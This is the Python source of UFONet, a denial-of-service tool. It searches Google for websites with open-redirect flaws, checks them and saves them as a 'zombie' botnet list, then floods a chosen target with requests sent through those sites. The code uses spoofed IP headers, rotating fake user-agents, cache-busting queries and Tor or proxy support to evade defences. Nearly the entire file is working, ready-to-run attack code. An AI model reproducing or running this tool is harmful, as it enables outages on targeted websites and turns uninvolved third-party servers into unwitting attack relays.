#!/usr/bin/env python 
# -*- coding: utf-8 -*-"
"""
UFONet - DDoS attacks via Web Abuse - 2013/2014 - by psy (epsylon@riseup.net)

You should have received a copy of the GNU General Public License along
with UFONet; if not, write to the Free Software Foundation, Inc., 51
Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
"""
import os, sys, re, traceback, random, time
import pycurl, StringIO, urllib, urllib2
from urlparse import urlparse
from random import randrange
from options import UFONetOptions
from update import Updater

DEBUG = 0

class RandomIP(object):
    """
    Class to generate random valid IP's
    """
    def _generateip(self, string):
        notvalid = [10, 127, 169, 172, 192]
        first = randrange(1, 256)
        while first is notvalid:
            first = randrange(1, 256)
        _ip = ".".join([str(first), str(randrange(1, 256)),
        str(randrange(1, 256)), str(randrange(1, 256))])
        return _ip

class UFONet(object):
    def __init__(self):
        self.agents = []
        self.agents.append('Mozilla/5.0 (iPhone; U; CPU iOS 2_0 like Mac OS X; en-us)')
        self.agents.append('Mozilla/5.0 (Linux; U; Android 0.5; en-us)')
        self.agents.append('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)')
        self.agents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)')
        self.agents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.13 (KHTML, like Gecko) Chrome/0.2.149.29 Safari/525.13')
        self.agents.append('Opera/9.25 (Windows NT 6.0; U; en)')
        self.agents.append('Mozilla/2.02E (Win95; U)')
        self.agents.append('Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)')
        self.agents.append('Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)')
        self.agents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 (FM Scene 4.6.1)')
        self.agents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 (.NET CLR 3.5.30729) (Prevx 3.0.5)')
        self.agents.append('(Privoxy/1.0)')
        self.agents.append('CERN-LineMode/2.15')
        self.agents.append('cg-eye interactive')
        self.agents.append('China Local Browser 2.6')
        self.agents.append('ClariaBot/1.0')
        self.agents.append('Comos/0.9_(robot@xyleme.com)')
        self.agents.append('Crawler@alexa.com')
        self.agents.append('DonutP; Windows98SE')
        self.agents.append('Dr.Web (R) online scanner: http://online.drweb.com/')
        self.agents.append('Dragonfly File Reader')
        self.agents.append('Eurobot/1.0 (http://www.ayell.eu)')
        self.agents.append('FARK.com link verifier')
        self.agents.append('FavIconizer')
        self.agents.append('Feliz - Mixcat Crawler (+http://mixcat.com)')
        self.agents.append('TwitterBot (http://www.twitter.com)')
        self.user_agent = random.choice(self.agents).strip()

        self.referer = 'http://127.0.0.1/'
        self.head = False
        self.payload = False
        self.external = False
        self.attack_mode = False
        self.retries = ''
        self.delay = ''
        self.connection_failed = False

    def set_options(self, options):
        self.options = options

    def create_options(self, args=None):
        self.optionParser = UFONetOptions()
        self.options = self.optionParser.get_options(args)
        if not self.options:
            return False
        return self.options

    def banner(self):
        print '='*75, "\n"
        print "888     888 8888888888 .d88888b.  888b    888          888    "   
        print "888     888 888        d88P" "Y888b  8888b   888          888    "
        print "888     888 888       888     888 88888b  888          888    "
        print "888     888 8888888   888     888 888Y88b 888  .d88b.  888888 "
        print "888     888 888       888     888 888 Y88b888 d8P  Y8b 888    "
        print "888     888 888       888     888 888  Y88888 88888888 888    "
        print "Y88b. .d88P 888       Y88b. .d88P 888   Y8888 Y8b.     Y88b.  "
        print " 'Y88888P'  888        'Y88888P'  888    Y888  'Y8888   'Y8888"       
        print self.optionParser.description, "\n"
        print '='*75

    def try_running(self, func, error, args=None):
        options = self.options
        args = args or []
        try:
            return func(*args)
        except Exception as e:
            print(error, "error")
            if DEBUG:
                traceback.print_exc()

    def run(self, opts=None):
        if opts:
            options = self.create_options(opts)
            self.set_options(options)
        options = self.options

        # check proxy options
        proxy = options.proxy
        if options.proxy:
            try:
                pattern = 'http[s]?://(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5]):[0-9][0-9][0-9][0-9]'
                m = re.search(pattern, proxy)
                if m is None:
                    self.banner()
                    print ("\n[Error] - Proxy malformed!\n")
                    sys.exit(2)
            except Exception:
                self.banner()
                print ("\n[Error] - Proxy malformed!\n")
                sys.exit(2)

        # check tor connection
        if options.checktor:
            self.banner()
            try:
                print("\nSending request to: https://check.torproject.org\n")
                tor_reply = urllib2.urlopen("https://check.torproject.org").read()
                your_ip = tor_reply.split('<strong>')[1].split('</strong>')[0].strip()
                if not tor_reply or 'Congratulations' not in tor_reply:
                    print("It seems that Tor is not properly set.\n")
                    print("Your IP address appears to be: " + your_ip + "\n")
                else:
                    print("Congratulations!. Tor is properly being used :-)\n")
                    print("Your IP address appears to be: " + your_ip + "\n")
            except:
                print("Cannot reach TOR checker system!. Are you correctly connected?\n")

        # search for 'zombies' on google results
        if options.search:
            try:
                self.banner()
                print("\nSearching for 'zombies' on google results. Good Luck ;-)\n")
                print '='*22 + '\n'
                zombies = self.search_zombies()
                check_url_link_reply = raw_input("Wanna check if they are valid zombies? (Y/n)\n")
                print '-'*25
                if check_url_link_reply == "n" or check_url_link_reply == "N":
                    print "\nBye!\n"
                else:
                    test = self.testing(zombies)
            except Exception:
                print ("[Error] - Something wrong searching!\n")

        # test web 'zombie' servers -> show statistics
        if options.test: 
            try:
                self.banner()
                zombies = self.extract_zombies()
                test = self.testing(zombies)
            except Exception:
                print ("\n[Error] - Something wrong testing!\n")
 
        # attack target -> exploit Open Redirect massively and connect all vulnerable servers to a target
        if options.target:
            try:
                self.banner()
                zombies = self.extract_zombies()
                attack = self.attacking(zombies)
            except Exception:
                print ("\n[Error] - Something wrong attacking!\n")

        # check/update for latest stable version
        if options.update:
            self.banner()
            try:
                print("\nTrying to update automatically to the latest stable version\n")
                Updater() 
            except:
                print("\nSomething was wrong!. You should checkout UFONet manually with:\n")
                print("$ git clone https://github.com/epsylon/ufonet\n")

    def search_zombies(self):
        # crawl google results to search for possible zombies
        options = self.options
        url = 'https://www.google.com/xhtml?'
        q = 'inurl:"' + str(options.search) + '"' # set query to search literally in google url results
        start = 0 # set index number of first entry
        if options.num_results: # set number of results to search
            try:
                num = int(options.num_results)
            except:
                print("You should specify and integer!!!. Using default value: 10\n")
                num = 10
        else:
            num = 10 
        gws_rd = 'ssl' # set SSL as default
        query_string = { 'q':q, 'start':start, 'num':num, 'gws_rd':gws_rd }
        data = urllib.urlencode(query_string)
        url = url + data
        headers = {'User-Agent' : self.user_agent, 'Referer' : self.referer} # set fake user-agent and referer
        if options.verbose:
            print("Query used: " + url + "\n")
        try:
            req = urllib2.Request(url, None, headers)
            google_reply = urllib2.urlopen(req).read()
        except: 
            print('[Error] - Unable to connect to google\n')
            sys.exit(2)
        #print google_reply
        regex = '<h3 class="r"><a href="/url(.+?)">' # search urls on google results using regex
        pattern = re.compile(regex)
        url_links = re.findall(pattern, google_reply)
        zombies = []
        for url in url_links:
            url_link = url.strip('?q=') # parse url_links to retrieve only a url
            url_link = urllib.unquote(url_link).decode('utf8') # unquote encoding
            sep = str(options.search)
            url_link = url_link.rsplit(sep, 1)[0] + sep
            if url_link not in zombies: # parse possible repetitions
                print('+Victim found: ' + url_link)
                print '-'*12
                zombies.append(url_link)
            else:
                pass
        if len(zombies) == 0:
            print "[INFO] - Not any possible victim found!. Try another search (ex: 'proxy.php?url=').\n"
            sys.exit(2)
        print '\n' + '='*22
        print('+Possible Zombies: ' + str(len(zombies)))
        print '='*22 + '\n'
        return zombies

    def extract_zombies(self):
        # extract targets from file (ex: 'zombies.txt')
        options = self.options
        if options.test:
            try:
                f = open(options.test)
                zombies = f.readlines()
                zombies = [ zombie.replace('\n','') for zombie in zombies ]
                f.close()
                if not zombies:
                    print "\n[Error] - Imposible to retrieve 'zombies' from the file."
                    sys.exit(2)
                else:
                    return zombies
            except:
                if os.path.exists(options.test) == True:
                    print '\n[Error] - Cannot open:', options.test, "\n"
                    sys.exit(2)
                else:
                    print '\n[Error] - Cannot found:', options.test, "\n"
                    sys.exit(2)
        else:
            try:
                f = open('zombies.txt')
                zombies = f.readlines()
                zombies = [ zombie.replace('\n','') for zombie in zombies ]
                f.close()
                if not zombies:
                    print "\n[Error] - Imposible to retrieve 'zombies' from the file."
                    sys.exit(2)
                else:
                    return zombies
            except:
                if os.path.exists('zombies.txt') == True:
                    print '\n[Error] - Cannot open:', 'zombies.txt', "\n"
                    sys.exit(2)
                else:
                    print '\n[Error] - Cannot found:', 'zombies.txt', "\n"
                    sys.exit(2)

    def update_zombies(self, zombies_ready):
        # update targets on file (ex: 'zombies.txt')
        options = self.options
        if options.test:
            f = open(options.test, "w") # re-write list only with valid zombies
            for zombie in zombies_ready:
                f.write(zombie + os.linesep)
            f.close()
        if options.search:
            with open("zombies.txt", "a") as zombie_list: # append them to existing list
                for zombie in zombies_ready:
                    zombie_list.write(zombie + os.linesep)

    def connect_zombies(self, zombie):
        # connect zombies and manage different options: HEAD, GET, POST,
        # user-Agent, referer, timeout, retries, threads, delay..
        options = self.options
        c = pycurl.Curl()
        if self.head == True:
            c.setopt(pycurl.URL, zombie) # set 'zombie' target
            c.setopt(pycurl.NOBODY, 1) # use HEAD
        if self.payload == True:
            payload = zombie + "http://www.google.es" #Open Redirect payload
            c.setopt(pycurl.URL, payload) # set 'zombie' payload
            c.setopt(pycurl.NOBODY, 0)  # use GET
        if self.external == True:
            external_service = "http://www.downforeveryoneorjustme.com/"
            external = external_service + options.target
            c.setopt(pycurl.URL, external) # external HEAD check before to attack
            c.setopt(pycurl.NOBODY, 0)  # use GET
        if self.attack_mode == True:
            if options.place:
            # use zombie's vector to connect to a target's place and add a random query to evade cache 
                random_hash = random.randint(1, 100000000)
                url_attack = zombie + options.target + "/"+ options.place + "?" + str(random_hash) 
            else:                                    
                url_attack = zombie + options.target # Use zombie vector to connect to original target url
                print url_attack
            c.setopt(pycurl.URL, url_attack) # GET connection on target site
            c.setopt(pycurl.NOBODY, 0)  # use GET
        fakeheaders = ['Accept: image/gif, image/x-bitmap, image/jpeg, image/pjpeg', 'Connection: Keep-Alive', 'Content-type: application/x-www-form-urlencoded; charset=UTF-8', 'Cache-control: no-cache', 'Pragma: no-cache', 'Pragma-directive: no-cache', 'Cache-directive: no-cache', 'Expires: 0'] # set fake headers (important: no-cache)
        c.setopt(pycurl.FOLLOWLOCATION, 1) # set follow redirects
        c.setopt(pycurl.MAXREDIRS, 10) # set max redirects
        c.setopt(pycurl.SSL_VERIFYHOST, 0) # don't verify host
        c.setopt(pycurl.SSL_VERIFYPEER, 0) # don't verify peer
        c.setopt(pycurl.SSLVERSION, pycurl.SSLVERSION_SSLv3) # sslv3
        c.setopt(pycurl.COOKIEFILE, '/dev/null') # black magic
        c.setopt(pycurl.COOKIEJAR, '/dev/null') # black magic
        c.setopt(pycurl.FRESH_CONNECT, 1) # important: no cache!
        if options.xforw: # set x-forwarded-for
            generate_random_xforw = RandomIP()
            xforwip = generate_random_xforw._generateip('')
            xforwfakevalue = ['X-Forwarded-For: ' + str(xforwip)]
            fakeheaders = fakeheaders + xforwfakevalue
        if options.xclient: # set x-client-ip
            generate_random_xclient = RandomIP()
            xclientip = generate_random_xclient._generateip('')
            xclientfakevalue = ['X-Client-IP: ' + str(xclientip)]
            fakeheaders = fakeheaders + xclientfakevalue
        if options.host: # set http host header
            host_fakevalue = ['Host: ' + str(options.host)]
            fakeheaders = fakeheaders + host_fakevalue
        c.setopt(pycurl.HTTPHEADER, fakeheaders) # set fake headers
        b = StringIO.StringIO()
        c.setopt(pycurl.HEADERFUNCTION, b.write)
        h = StringIO.StringIO()
        c.setopt(pycurl.WRITEFUNCTION, h.write)
        if options.agent: # set user-agent
            c.setopt(pycurl.USERAGENT, options.agent)
        else:
            c.setopt(pycurl.USERAGENT, self.user_agent)
        if options.referer: # set referer
            c.setopt(pycurl.REFERER, options.referer)
        else:
            c.setopt(pycurl.REFERER, self.referer)
        if options.proxy: # set proxy
            c.setopt(pycurl.PROXY, options.proxy)
        else:
            c.setopt(pycurl.PROXY, '')
        if options.timeout: # set timeout
            c.setopt(pycurl.TIMEOUT, options.timeout)
            c.setopt(pycurl.CONNECTTIMEOUT, options.timeout)
        else:
            c.setopt(pycurl.TIMEOUT, 10)
            c.setopt(pycurl.CONNECTTIMEOUT, 10)
        if options.delay: # set delay
            self.delay = options.delay
        else:
            self.delay = 0
        if options.retries: # set retries
            self.retries = options.retries
        else:
            self.retries = 1
        try: # try to connect
            c.perform()
            time.sleep(self.delay)
            self.connection_failed = False
        except: # try retries
            for count in range(0, self.retries):
                time.sleep(self.delay)
                try:
                    c.perform()
                    self.connection_failed = False
                except:
                    self.connection_failed = True
        if self.head == True: # HEAD reply
            code_reply = c.getinfo(pycurl.HTTP_CODE)
            reply = b.getvalue()
            if options.verbose:
                print "Reply:"
                print "\n", reply
            return code_reply
        if self.external == True: # External reply
            external_reply = h.getvalue()
            if options.verbose:
                print "Reply:"
                print "\n", external_reply
            return external_reply
        if self.payload == True: # Payloads reply
            payload_reply = h.getvalue()
            if options.verbose:
                print "Reply:"
                print "\n", payload_reply
            return payload_reply
        if self.attack_mode == True: # Attack mode reply
            attack_reply = h.getvalue()
            if options.verbose:
                print "Reply:"
                print "\n", attack_reply
            return attack_reply

    def testing(self, zombies):
        # test Open Redirect vulnerabilities on webapps and show statistics
        # HTTP HEAD check
        print ("Are 'they' alive? :-) (HEAD Check):")
        print '='*35
        num_active_zombies = 0
        num_failed_zombies = 0
        active_zombies = []
        army = 0
        print "Trying:", len(zombies)
        print '-'*21
        for zombie in zombies:
            if self.options.search:
                zombie = str(zombie)
            t = urlparse(zombie)
            if zombie.startswith("http://") or zombie.startswith("https://"):
                # send HEAD connection
                self.head = True
                code_reply = str(self.connect_zombies(zombie))
                self.head = False
                if code_reply == "200" or code_reply == "302" or code_reply == "301" or code_reply == "401" or code_reply == "403" or code_reply == "405":
                    name_zombie = t.netloc
                    print "Zombie:", name_zombie
                    print "Status: Ok ["+ code_reply + "]"
                    num_active_zombies = num_active_zombies + 1
                    active_zombies.append(zombie)
                elif code_reply == "404":
                    print "Zombie:", t.netloc
                    print "Status: Not Found ["+ code_reply + "]"
                    num_failed_zombies = num_failed_zombies + 1
                else:
                    print "Zombie:", t.netloc
                    print "Status: Not Allowed ["+ code_reply + "]"
                    num_failed_zombies = num_failed_zombies + 1
            else:
                if self.options.verbose:
                    print "Reply:", "\n\nNothing!!!!!\n"
                print "Zombie:", zombie
                print "Status: Malformed!"
                num_failed_zombies = num_failed_zombies + 1
            print '-'*10
        print '='*18
        print "OK:", num_active_zombies, "Fail:", num_failed_zombies
        print '='*18
        if num_active_zombies == 0:
            print "\n[INFO] - Not any zombie active!\n"
            sys.exit(2)
        print '='*22
        # check url parameter vectors
        print ("Checking for payloads:")
        print '='*22
        print "Trying:", num_active_zombies
        print '-'*21
        zombies_ready = []
        num_waiting_zombies = 0
        num_disconnected_zombies = 0
        for zombie in active_zombies:
            if self.options.search:
                zombie = str(zombie)
            t = urlparse(zombie)
            name_zombie = t.netloc
            payload_zombie = zombie
            print "Vector:", payload_zombie
            self.payload = True
            try:
                payload_reply = str(self.connect_zombies(zombie))
            except:
                payload_reply = ""
            self.payload = False
            if "http://www.google.es" in payload_reply: #Open Redirect reply
                num_waiting_zombies = num_waiting_zombies + 1
                print "Status:", "Waiting your orders..."
                zombies_ready.append(zombie)
            else:
                num_disconnected_zombies = num_disconnected_zombies + 1
                print "Status:", "Not ready..."
            army = army + 1
            print '-'*10
        print '='*18
        print "OK:", num_waiting_zombies, "Fail:", num_disconnected_zombies
        print '='*18
        print '='*18
        # list of 'zombies' ready to attack
        print ("Army of 'zombies'")
        print '='*18
        num_active_zombie = 0
        for z in zombies_ready:
            t = urlparse(z)
            name_zombie = t.netloc
            num_active_zombie = num_active_zombie + 1
            if self.options.verbose:
                print "Zombie [", num_active_zombie, "]:", name_zombie
        print '-'*18
        print "Total Army:", num_active_zombie
        print '-'*18
        # update 'zombies' list
        if num_active_zombie == 0:
            print "\n[INFO] - Not any zombie active!\n"
        else:
            update_reply = raw_input("Wanna update your army (Y/n)")
            print '-'*25
            if update_reply == "n" or update_reply == "N":
                print "\nBye!\n"
            else:
                self.update_zombies(zombies_ready)
                print "\n[INFO] - Botnet updated! ;-)\n"

    def attacking(self, zombies):
        # Perform a DDoS Web attack against a target, using Open Redirect vectors on third party machines (aka 'zombies')
        target = self.options.target
        if target.startswith("http://") or target.startswith("https://"):
            print "Attacking: ", target
            print '='*55, "\n"
            # send Open Redirect injection
            reply = self.injection(target, zombies)
        else:
            print "\n[Error] - Target url not valid!\n"

    def injection(self, target, zombies):
        options = self.options
        head_check_here = False
        head_check_external = False
        print '='*21
        print "Round: 'Is target up?'"
        print '='*21
        # send HEAD connection
        self.head = True
        try:
            reply = self.connect_zombies(target)
            if reply:
                print "From here: YES"
                head_check_here = True
            else:
                print "From Here: NO | WARNING: Check failed from your connection ;("
                head_check_here = False
        except Exception:
            print "From Here: NO | WARNING: Check failed from your connection ;("
            head_check_here = False
        self.head = False
        print '-'*21
        # check target on third party service (ex: http://www.downforeveryoneorjustme.com)
        self.external = True
        try:
            external_reply = self.connect_zombies(target)
            if "It's just you" in external_reply: # parse external service for correct reply
                print "From exterior: YES"
                head_check_external = True
            else:
                print "From exterior: NO | WARNING: Check failed from external services ;("
                head_check_external = False
        except Exception: 
            print "From exterior: NO | WARNING: Check failed from external services ;("
            head_check_external = False
        self.external = False
        print '-'*21, "\n"
        # ask for start the attack
        if head_check_here == True or head_check_external == True:
            start_reply = raw_input("Your target looks ONLINE!. Wanna start a DDoS attack? (y/N)\n")
            print '-'*25
            if start_reply == "y" or start_reply == "Y":
                total_rounds = options.rounds # extract number of rounds
                if total_rounds <= "0":
                    total_rounds = 1
                num_round = 1
                num_hits = 0
                num_zombie = 1
                # start to attack the target with each zombie
                zombies = self.extract_zombies() # extract zombies from file
                total_zombie = len(zombies)
                for i in range(0, int(total_rounds)):
                    for zombie in zombies:
                        print '='*45
                        print "Zombie:", num_zombie, "| Round:", num_round, "| Total Rounds:", total_rounds
                        print '='*45
                        t = urlparse(zombie)
                        name_zombie = t.netloc
                        self.attack_mode = True
                        print "Name:", name_zombie
                        attack_reply = self.connect_zombies(zombie)
                        if self.connection_failed == False:
                            print "Status: Hit!"
                            num_hits = num_hits + 1
                        else:
                            print "Status: Failed :("
                        num_zombie = num_zombie + 1
                        if num_zombie > total_zombie:
                            num_zombie = 1
                        print '-'*10
                    num_round = num_round + 1
                attack_mode = False
                print '='*21
                print "Total hits:", num_hits
                print '='*21
                print "\n[INFO] - Attack completed! ;-)\n"
            else:
                print "\nBye!\n"
        else:
            print "Your target looks OFFLINE!?\n"
            print '-'*25
            print "\nBye!\n"

if __name__ == "__main__":
    app = UFONet()
    options = app.create_options()
    if options:
        app.set_options(options)
        app.run()
